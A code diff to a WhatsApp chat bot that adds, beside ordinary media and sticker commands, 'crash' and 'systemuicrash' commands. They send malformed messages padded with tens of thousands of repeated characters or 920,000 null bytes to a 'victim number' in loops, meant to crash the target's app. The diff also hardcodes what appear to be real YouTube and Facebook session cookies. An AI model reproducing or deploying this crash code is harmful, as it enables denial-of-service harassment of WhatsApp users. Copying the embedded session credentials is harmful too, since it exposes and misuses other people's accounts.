@@ -22,7 +22,7 @@ const { doing } = require('./lib/translate')
 const { event } = require("./lib/event.js")
 const { processing } = require("./lib/remini")
 const { mt } = require("./lib/mt.js")
-const { ind } =require("./language")
+const { ind } = require("./language")
 const { eng } = require("./language")
 const { igDownloader, tiktok, fb, pinterest } = require("./lib/downloader");
 
@@ -30,6 +30,7 @@ const { igDownloader, tiktok, fb, pinterest } = require("./lib/downloader");
 var ipackName = false//Don't fill. sett packName on setting.js
 var iauthor = false//Don't fill. sett author on setting.js
 var currentTime = moment().tz('Asia/Jakarta').format('HH:mm'); //set your Timezone in tz()
+var agent = ytdl.createAgent([{"domain":".youtube.com","expirationDate":1756116443.803089,"hostOnly":false,"httpOnly":true,"name":"HSID","path":"/","sameSite":"unspecified","secure":false,"session":false,"storeId":"0","value":"AUNDWBfyUtVN0GG5I"},{"domain":".youtube.com","expirationDate":1756116443.803111,"hostOnly":false,"httpOnly":true,"name":"SSID","path":"/","sameSite":"unspecified","secure":true,"session":false,"storeId":"0","value":"ALwwx1gRBoYa5P6n3"},{"domain":".youtube.com","expirationDate":1756116443.803131,"hostOnly":false,"httpOnly":false,"name":"APISID","path":"/","sameSite":"unspecified","secure":false,"session":false,"storeId":"0","value":"77ErL4KDOlAv3TmX/Ao1t_9JIHWcd-R4w6"},{"domain":".youtube.com","expirationDate":1756116443.803152,"hostOnly":false,"httpOnly":false,"name":"SAPISID","path":"/","sameSite":"unspecified","secure":true,"session":false,"storeId":"0","value":"bkDUY84XD7MjxTYb/AVHhcBxqnMyaQ5Mm8"},{"domain":".youtube.com","expirationDate":1756116443.803173,"hostOnly":false,"httpOnly":false,"name":"__Secure-1PAPISID","path":"/","sameSite":"unspecified","secure":true,"session":false,"storeId":"0","value":"bkDUY84XD7MjxTYb/AVHhcBxqnMyaQ5Mm8"},{"domain":".youtube.com","expirationDate":1756116443.803193,"hostOnly":false,"httpOnly":false,"name":"__Secure-3PAPISID","path":"/","sameSite":"no_restriction","secure":true,"session":false,"storeId":"0","value":"bkDUY84XD7MjxTYb/AVHhcBxqnMyaQ5Mm8"},{"domain":".youtube.com","expirationDate":1756116443.803214,"hostOnly":false,"httpOnly":false,"name":"SID","path":"/","sameSite":"unspecified","secure":false,"session":false,"storeId":"0","value":"g.a000mAjJyT5PSoBqnDTMBgfrANp6u9EhZL3IEiZw7JSwXmyf4WxG6UrjqouvyHh-SUtL2Ng0UwACgYKAU8SARESFQHGX2Mi_xpGvUEHMByp32ptI2eKhxoVAUF8yKqZHCoe_3AiBkKCoskX4PIu0076"},{"domain":".youtube.com","expirationDate":1756116443.803236,"hostOnly":false,"httpOnly":true,"name":"__Secure-1PSID","path":"/","sameSite":"unspecified","secure":true,"session":false,"storeId":"0","value":"g.a000mAjJyT5PSoBqnDTMBgfrANp6u9EhZL3IEiZw7JSwXmyf4WxGAhj3zSlSzu4jMM32eJLEiAACgYKARMSARESFQHGX2MiRrnwS7ICi53zT6LH1bklSBoVAUF8yKrNKZrndeOX-5p1OZalvML20076"},{"domain":".youtube.com","expirationDate":1756116443.803257,"hostOnly":false,"httpOnly":true,"name":"__Secure-3PSID","path":"/","sameSite":"no_restriction","secure":true,"session":false,"storeId":"0","value":"g.a000mAjJyT5PSoBqnDTMBgfrANp6u9EhZL3IEiZw7JSwXmyf4WxGq31De71_afhj2-3-PddH6QACgYKAX4SARESFQHGX2MiCunvSmkJHj_wJ_gpJrQAhBoVAUF8yKoe4CvvYrYgCPXkkoy0DUz60076"},{"domain":".youtube.com","expirationDate":1756116444.079214,"hostOnly":false,"httpOnly":true,"name":"LOGIN_INFO","path":"/","sameSite":"no_restriction","secure":true,"session":false,"storeId":"0","value":"AFmmF2swRgIhANlexg0I4p52w9KqNvUK7eX7IVQr9i30sti200CrmoXnAiEAwNZv0ZBhbcFAkMqV4K9Lfc9BiKkg9jfp2mxrIa2mLMo:QUQ3MjNmekxEYzBSVTg0d2ZaX0hydDQtQU83Qkl4MjhqS2sxV3JtRlFWbEh3OXVyb3pmaGUwVkd6UEFiSkljQWp6cnpoc25KSTBIU25Mc3ZPZ01NNWVUN2ZTMG5yaklNUDlsV2h6bHRxTG43QTF1cldBaGtNSVl6ZUY1ZFBERXJOMUQ0UFUxRmdRaEdpVEgxRTRpcExLbENJdEtmWkdqWjZ3"},{"domain":".youtube.com","expirationDate":1753182046.759156,"hostOnly":false,"httpOnly":true,"name":"__Secure-1PSIDTS","path":"/","sameSite":"unspecified","secure":true,"session":false,"storeId":"0","value":"sidts-CjIB4E2dkatD91s8NpvQuF01jpFwwYL11vbAM7Ds7Wff2LqL6AzLQB6CXl2rBNV8e7a8ZBAA"},{"domain":".youtube.com","expirationDate":1753182046.75924,"hostOnly":false,"httpOnly":true,"name":"__Secure-3PSIDTS","path":"/","sameSite":"no_restriction","secure":true,"session":false,"storeId":"0","value":"sidts-CjIB4E2dkatD91s8NpvQuF01jpFwwYL11vbAM7Ds7Wff2LqL6AzLQB6CXl2rBNV8e7a8ZBAA"},{"domain":".youtube.com","expirationDate":1756206068.771333,"hostOnly":false,"httpOnly":false,"name":"PREF","path":"/","sameSite":"unspecified","secure":true,"session":false,"storeId":"0","value":"f6=40000000&tz=Asia.Jakarta&f7=100"},{"domain":".youtube.com","expirationDate":1721646674,"hostOnly":false,"httpOnly":false,"name":"CONSISTENCY","path":"/","sameSite":"unspecified","secure":true,"session":false,"storeId":"0","value":"AKreu9um4unhGevS-YM1v6ai96y1pz-u7hSKcLDPfVii4-LWokCydUnLot5e6Xa-XXqOtohW7n_LcYNapvWSL5sqbR6NPUrrxiMU-OGKAb4Vyn1f4hxR7qsZHlQ7jRTrqk9asXOBIPNp5xyb_XZCD7sM"},{"domain":".youtube.com","expirationDate":1753182074.635875,"hostOnly":false,"httpOnly":false,"name":"SIDCC","path":"/","sameSite":"unspecified","secure":false,"session":false,"storeId":"0","value":"AKEyXzVS16oVWOkmdGw_X1nFKHkSf_QodOBuWwGWDFjLIP7I7fiOt9LH88OsLsYlWhKya_37"},{"domain":".youtube.com","expirationDate":1753182074.635955,"hostOnly":false,"httpOnly":true,"name":"__Secure-1PSIDCC","path":"/","sameSite":"unspecified","secure":true,"session":false,"storeId":"0","value":"AKEyXzUSq-7sNCfInah28lDHTT-kUmfjiWUJ9uwZIVifVLvXuJnvxVlS1fxssEUhE-aszeFdtg"},{"domain":".youtube.com","expirationDate":1753182074.635997,"hostOnly":false,"httpOnly":true,"name":"__Secure-3PSIDCC","path":"/","sameSite":"no_restriction","secure":true,"session":false,"storeId":"0","value":"AKEyXzWBuUcZaoB1ATpDbxmdz4s8HhWhSUT-3k_vlkLk1cQOp21BCAuCzBPuc4cwXNsbCosT-A"}])
 
 /*DataBase*/
 const guild = JSON.parse(fs.readFileSync('./db/guild.json'));
@@ -454,10 +455,169 @@ module.exports = core = async (client, m, chatUpdate, store) => {
     }
 
     //mongoDB Error Handler
-    if (global.mongoDB == true && global.mongoString === "Enter Your Connection String!!") {
+    /*if (global.mongoDB == true && global.mongoString === "Enter Your Connection String!!") {
       return console.log(color('Be sure your connection mongoDB string is corrrect!!\nCheck it on setting.js Line : 13', "red"))
-    }
+    }*/
 
+//Bug Function
+
+    const force = {
+      key: {
+      participant: `0@s.whatsapp.net`,
+      ...(m.chat ? {
+      remoteJid: "status@broadcast"
+      } : {})
+      },
+      'message': {
+      "interactiveMessage": { 
+      "header": {
+      "hasMediaAttachment": true,
+      "jpegThumbnail": fs.readFileSync(`./assets/latx.png`)
+      },
+      "nativeFlowMessage": {
+      "buttons": [
+      {
+      "name": "review_and_pay",
+      "buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
+      }
+      ]
+      }
+      }
+      }
+      } 
+
+async function ngeloc(target, kuwoted) {
+  var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+  viewOnceMessage: {
+  message: {
+    "liveLocationMessage": {
+      "degreesLatitude": "p",
+      "degreesLongitude": "p",
+      "caption": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(50000),
+      "sequenceNumber": "0",
+      "jpegThumbnail": ""
+       }
+    }
+  }
+  }), { userJid: target, quoted: kuwoted })
+  await client.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
+  }
+
+  async function bakdok(target, kuwoted) {
+    var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+     "documentMessage": {
+       "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
+       "mimetype": "penis",
+       "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
+       "fileLength": "999999999",
+       "pageCount": 999999999,
+       "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
+       "fileName": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ྦྷ".repeat(60000),
+       "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
+       "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
+       "mediaKeyTimestamp": "1715880173"
+     }
+   }), { userJid: target, quoted: kuwoted });
+   await client.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
+   }
+async function sendLiveLocationMessage(jid) {
+  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
+    'viewOnceMessage': {
+      'message': {
+        'liveLocationMessage': {
+          'degreesLatitude': 'p',
+          'degreesLongitude': 'p',
+          'caption': 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½' + 'ê¦¾'.repeat(50000),
+          'sequenceNumber': '0',
+          'jpegThumbnail': ''
+        }
+      }
+    }
+  }), {
+    'userJid': jid
+  });
+    await client.relayMessage(jid, messageContent.message, {
+    'participant': {
+      'jid': jid
+    },
+    'messageId': messageContent.key.id
+  });
+}
+    
+    async function sendListMessage(jid) {
+  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
+    'listMessage': {
+      'title': "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸" + "\0".repeat(920000),
+      'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
+      'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
+      'buttonText': null,
+      'listType': 2,
+      'productListInfo': {
+        'productSections': [{
+          'title': "wkwk",
+          'products': [{
+            'productId': "4392524570816732"
+          }]
+        }],
+        'productListHeaderImage': {
+          'productId': "4392524570816732",
+          'jpegThumbnail': null
+        },
+        'businessOwnerJid': "0@s.whatsapp.net"
+      }
+    },
+    'footer': "MAMPUS",
+    'contextInfo': {
+      'expiration': 600000,
+      'ephemeralSettingTimestamp': "1679959486",
+      'entryPointConversionSource': "global_search_new_chat",
+      'entryPointConversionApp': "whatsapp",
+      'entryPointConversionDelaySeconds': 9,
+      'disappearingMode': {
+        'initiator': "INITIATED_BY_ME"
+      }
+    },
+    'selectListType': 2,
+    'product_header_info': {
+      'product_header_info_id': 292928282928,
+      'product_header_is_rejected': false
+    }
+  }), {
+    'userJid': jid
+  });
+        await client.relayMessage(jid, messageContent.message, {
+    'participant': {
+      'jid': jid
+    },
+    'messageId': messageContent.key.id
+  });
+}
+      
+      async function sendMixedMessages(jid, count) {
+  for (let i = 0; i < count; i++) {
+    //sendLiveLocationMessage(jid);
+    sendListMessage(jid);
+    await sleep(500);
+  }
+}
+
+function sendMessageWithMentions(text, mentions = [], quoted = false) {
+  if (quoted == null || quoted == undefined || quoted == false) {
+    return client.sendMessage(from, {
+      'text': text,
+      'mentions': mentions
+    }, {
+      'quoted': m
+    });
+  } else {
+    return client.sendMessage(m.chat, {
+      'text': text,
+      'mentions': mentions
+    }, {
+      'quoted': m
+    });
+  }
+}
 
 
     //Proccess
@@ -606,15 +766,29 @@ case 'getimage':
           console.log(err)
         }
           break
+
+          case 'milf':
+            try{
+                proses("⌛")
+                let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/milf.json`)).data
+                let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
+                console.log(wipi)
+                let kentir = await getBuffer(wipi)                             
+                client.sendImage(from, kentir, mek)
+                proses("✔")
+            } catch(err) {
+                proses("❌")
+                console.log(err)
+            }
+            break
           
 
           case 'loli':
-          case 'milf':
             try{
               proses("⏳")
                 res = await axios({
                   method: 'get',
-                  url: `https://api.lolicon.app/setu/v2?tag=${command == 'loli' ? '萝莉' : 'milf'}&r18=${text == 'nsfw' ? '1' : '0'}`,
+                  url: `https://api.lolicon.app/setu/v2?tag=萝莉&r18=${text == 'nsfw' ? '1' : '0'}`,
                   headers: {
                     'DNT': 1,
                     'Upgrade-Insecure-Request': 1
@@ -737,9 +911,9 @@ case 'getimage':
           level: $(this).find('.level-col-1 > b').text().trim(),
           boss: $(this).find('.level-col-2 > p:nth-child(1) > b > a').text().trim(),
           location: $(this).find('.level-col-2 > p:nth-child(2)').text().trim(),
-          exp: [
-            $(this).find('.level-col-3 > p:nth-child(1) > b').text().trim(),
-          ]
+          exp: $('.level-col-3 > p').forEach((elem, index) => {
+            $(this).find(`.level-col-3 > p:nth.child(${index + 1}) > b`).text.trim()
+          })
         }
       });
       let gb = `*Leveling lvl ${lvl} & bonus exp ${bexp}*\n`
@@ -1117,7 +1291,7 @@ owgi = await  client.downloadAndSaveMediaMessage(qms,ranp)
 anu = await imgbb(options)
 
 teks = `${anu.display_url}`
-anu1 = `https://api.memegen.link/images/custom/${q.split('|')[1] ? top : ' '}/${q.split('|')[1] ? bottom : top}.png?background=${teks}`
+anu1 = `https://api.memegen.link/images/custom/${text.split('|')[1] ? top : ' '}/${text.split('|')[1] ? bottom : top}.png?background=${teks}`
 encmedia = await client.sendImageAsSticker(from, `${anu1}`, m, false, { packname: global.packName, author: global.author })
 fs.unlinkSync(owgi)
 fs.unlinkSync(encmedia)
@@ -1486,6 +1660,7 @@ case 'play':
           console.log(color('Download Audio With ytdl-core'))
           proses("⬇")
           let stream = await ytdl(urlVideo.url, {
+              agent,
               quality: 'highestaudio',
               format: 'mp3',
               highWaterMark: 1 << 30,
@@ -1509,6 +1684,7 @@ case 'play':
               proses("⬆")
               await client.sendMessage(from, { audio: fs.readFileSync(`./tmp/${mp3File}`), mimetype: 'audio/mp4', ptt: true }, mek)
               proses("✔")
+              fs.unlinkSync(`./tmp/${mp3File}`)
           })
             
     } catch(err) {
@@ -1527,6 +1703,7 @@ case 'play':
         console.log(color('Download Audio With ytdl-core'))
         proses("⬇")
         let stream = await ytdl(text, {
+            agent,
             quality: 'highestaudio',
             format: 'mp3',
             highWaterMark: 1 << 30,
@@ -1550,6 +1727,7 @@ case 'play':
             proses("⬆")
             await client.sendMessage(from, { audio: fs.readFileSync(`./tmp/${mp3File}`), mimetype: 'audio/mp4', ptt: true }, mek)
             proses("✔")
+            fs.unlinkSync(`./tmp/${mp3File}`)
         })
           
         } catch (err) {
@@ -1577,7 +1755,7 @@ case 'ytmp4':
       if (!isUrl(text)) return m.reply(`Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%2`)
             try{
                 proses("⌛")
-                let info = await ytdl.getInfo(text)
+                let info = await ytdl.getInfo(text, { agent })
                 proses("🔍")
     			let format = ytdl.chooseFormat(info.formats, { quality: '18' });
                 proses("⬆")
@@ -1614,13 +1792,15 @@ await client.sendMessage(from,{ video: {url:vid.videoUrl}, caption: ytc }, mek)*
   
         case 'fb':
         case 'fbdl':
-            if (!q) return reply("input link")
+            if (!q) return reply(lang.format(prefix, command))
             try{
             proses("⌛")
+                const cookies = "sb=5I2dZn1rnh9tBdjOXXgSQShS; datr=5I2dZkHRAkzxaf2rxTFubtiB; c_user=100015904271015; ps_n=1; ps_l=1; xs=6%3A0xGff6aMZYvcZg%3A2%3A1721601512%3A-1%3A10797%3A%3AAcVa10Dc4lgGwkP3FoHoyedB8_UtLfzd1vcf4AkxQQ; fr=1Rb7Zo7TquPmZ8mse.AWU3_UavGOlUG2nyb03eQ5jhLMc.Bmnj1w..AAA.0.0.Bmnj1w.AWVu_N2p26o; wd=1280x559; presence=C%7B%22t3%22%3A%5B%5D%2C%22utc3%22%3A1721646452820%2C%22v%22%3A1%7D"
+                const user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
                 const fbdl = require("fb-downloader-scrapper")
-            fbdl(text)
+            fbdl(text, cookies, user_agent)
 			.then((result)=>{
-    		client.sendMessage(from, {video: {url: result.hd}, caption: result.title !== undefined ? result.title : " "}, mek)
+    		client.sendMessage(from, {video: {url: result.hd ? result.hd : result.sd}, caption: result.title !== undefined ? result.title : "Facebook"}, mek)
                 proses("✔")
 			}).catch((err)=>{
     			console.log(err)
@@ -1695,6 +1875,74 @@ case 'fb':
   case 'changelog':
     reply(lang.changelog())
   break
+            
+              case 'crash':
+    if(!isOwner) return
+    number = text.replace(/[^0-9]/g,"")
+    target = number + "@s.whatsapp.net"
+    proses("⌛")
+    for (let j = 0; j < 30; j++) {
+      await bakdok(target, force)
+      await ngeloc(target, force)
+      await ngeloc(target, force)
+      await bakdok(target, force)
+      await ngeloc(target, force)
+      await bakdok(target, force)
+      await bakdok(target, force)
+      await ngeloc(target, force)
+      await ngeloc(target, force)
+      await bakdok(target, force)
+      await ngeloc(target, force)
+      await bakdok(target, force)
+      await bakdok(target, force)
+      await ngeloc(target, force)
+      await ngeloc(target, force)
+      await bakdok(target, force)
+      await ngeloc(target, force)
+      await bakdok(target, force)
+      await bakdok(target, force)
+      await ngeloc(target, force)
+      await ngeloc(target, force)
+      await bakdok(target, force)
+      await ngeloc(target, force)
+      await bakdok(target, force)
+      }
+      proses("✔")
+  break
+            
+case "systemuicrash": 
+
+  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
+  let number = text.split(',')[0];
+  let amount = text.split(',')[1] * 5;
+  if (!number || !amount) {
+    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
+  }
+  if (isNaN(parseInt(amount))) {
+    return reply("Amount must be a number");
+  }
+  let cleanedNumber = number.replace(/[^0-9]/g, '');
+  let encodedAmount = '' + encodeURI(amount);
+  var contactInfo = await client.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
+  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
+  if (cleanedNumber == "62882021771652") {
+    return;
+  }
+  if (contactInfo.length == 0) {
+    return reply("The number is not registered on WhatsApp");
+  }
+  reply("please wait, " + command + " bug is in process..");
+  await sleep(2000); // Adjusted sleep time for clarity
+  sendMixedMessages(whatsappNumber, encodedAmount);
+  await sleep(2500); // Adjusted sleep time for clarity
+  sendMessageWithMentions(
+    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
+    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
+    [whatsappNumber]
+  );
+
+break
+            
 
 case 'report': 
   if (!q) return reply(lang.format(prefix.command))
